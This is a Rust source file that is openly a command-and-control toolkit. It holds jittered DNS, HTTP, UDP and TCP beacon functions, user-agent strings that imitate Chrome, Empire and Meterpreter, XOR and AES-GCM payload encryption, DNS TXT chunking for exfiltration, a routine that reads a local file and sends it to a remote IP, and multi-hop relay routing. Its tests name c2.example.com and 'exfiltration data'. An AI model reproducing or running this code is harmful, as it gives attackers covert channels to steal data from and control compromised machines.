use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce,
    aead::generic_array::GenericArray,
};
use base64;
use rand::{Rng, thread_rng};
use std::collections::HashMap;
use std::net::{UdpSocket, TcpStream};
use std::time::{SystemTime, UNIX_EPOCH};
use std::io::{Write, Read};
use std::fs;

/// === CRYPTO PRIMITIVES ===

pub fn xor_encode(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|b| b ^ key).collect()
}

pub fn xor_decode(data: &[u8], key: u8) -> Vec<u8> {
    xor_encode(data, key)
}

pub fn otp_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect()
}

pub fn aes_gcm_encrypt(data: &[u8], key_hex: &str, nonce_hex: &str) -> Result<Vec<u8>, String> {
    let key = GenericArray::from_slice(&hex::decode(key_hex).map_err(|e| e.to_string())?);
    let nonce = GenericArray::from_slice(&hex::decode(nonce_hex).map_err(|e| e.to_string())?);
    let cipher = Aes256Gcm::new(key);
    cipher.encrypt(nonce, data).map_err(|e| format!("AES-GCM error: {}", e))
}

pub fn aes_gcm_decrypt(data: &[u8], key_hex: &str, nonce_hex: &str) -> Result<Vec<u8>, String> {
    let key = GenericArray::from_slice(&hex::decode(key_hex).map_err(|e| e.to_string())?);
    let nonce = GenericArray::from_slice(&hex::decode(nonce_hex).map_err(|e| e.to_string())?);
    let cipher = Aes256Gcm::new(key);
    cipher.decrypt(nonce, data).map_err(|e| format!("AES-GCM decrypt failed: {}", e))
}

/// === NETWORK BEACONS ===

pub fn jitter_delay(base_secs: u64, jitter_percent: f64) -> u64 {
    let jitter = (base_secs as f64 * jitter_percent) as u64;
    let offset = thread_rng().gen_range(0..=jitter);
    if thread_rng().gen_bool(0.5) {
        base_secs + offset
    } else {
        base_secs.saturating_sub(offset)
    }
}

pub fn format_dns_beacon(command: &str, domain: &str) -> String {
    let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
    format!("{}.{}.{}", command, ts, domain)
}

pub fn format_http_beacon(command: &str) -> String {
    format!("/beacon?cmd={}", command)
}

pub fn user_agent_profiles(profile: &str) -> &'static str {
    match profile {
        "chrome" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0",
        "curl" => "curl/7.68.0",
        "empire" => "Mozilla/5.0 (PowerShell; Empire; TLS)",
        "metasploit" => "Meterpreter HTTP Beacon",
        _ => "Mozilla/5.0 (Generic Agent)",
    }
}

/// === TRANSPORTS ===

pub fn udp_beacon(ip: &str, port: u16, payload: &[u8]) -> std::io::Result<()> {
    let sock = UdpSocket::bind("0.0.0.0:0")?;
    sock.send_to(payload, format!("{}:{}", ip, port))?;
    Ok(())
}

pub fn tcp_beacon(ip: &str, port: u16, payload: &[u8]) -> std::io::Result<()> {
    let mut stream = TcpStream::connect((ip, port))?;
    stream.write_all(payload)?;
    Ok(())
}

pub fn http_get_beacon(url: &str, query: &str, ua_profile: &str) -> Result<String, String> {
    let client = reqwest::blocking::Client::builder()
        .user_agent(user_agent_profiles(ua_profile))
        .build()
        .map_err(|e| e.to_string())?;

    let full_url = format!("{}{}", url, query);
    let res = client.get(&full_url).send().map_err(|e| e.to_string())?;
    Ok(res.text().unwrap_or_default())
}

/// === EXFIL + REPLAY ===

pub fn encode_dns_txt_chunks(data: &[u8], max_len: usize) -> Vec<String> {
    let b64 = base64_encode(data);
    b64.as_bytes()
        .chunks(max_len)
        .map(|c| String::from_utf8_lossy(c).to_string())
        .collect()
}

pub fn base64_encode(data: &[u8]) -> String {
    base64::encode(data)
}

pub fn base64_decode(encoded: &str) -> Result<Vec<u8>, base64::DecodeError> {
    base64::decode(encoded)
}

pub fn replay_from_file(path: &str, ip: &str, port: u16) -> std::io::Result<()> {
    let data = fs::read(path)?;
    udp_beacon(ip, port, &data)
}

/// ===  ONION-LIKE ROUTING (Multi-Hop) ===

pub fn multi_hop_route(
    hops: &[(&str, u16)],
    encrypted_blob: &[u8],
    delay_between_hops_ms: u64,
) -> std::io::Result<()> {
    for (i, (ip, port)) in hops.iter().enumerate() {
        println!("[C2] HOP {} → {}:{}", i + 1, ip, port);
        udp_beacon(ip, *port, encrypted_blob)?;
        std::thread::sleep(std::time::Duration::from_millis(delay_between_hops_ms));
    }
    Ok(())
}

/// === TEST HARNESS ===

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jitter() {
        let j = jitter_delay(60, 0.3);
        assert!(j >= 42 && j <= 78);
    }

    #[test]
    fn test_dns_beacon_format() {
        let s = format_dns_beacon("whoami", "c2.example.com");
        assert!(s.contains("whoami"));
        assert!(s.ends_with("c2.example.com"));
    }

    #[test]
    fn test_encode_chunks() {
        let v = encode_dns_txt_chunks(b"supersecretexfiltrationdata", 16);
        assert!(v.len() > 1);
    }
}

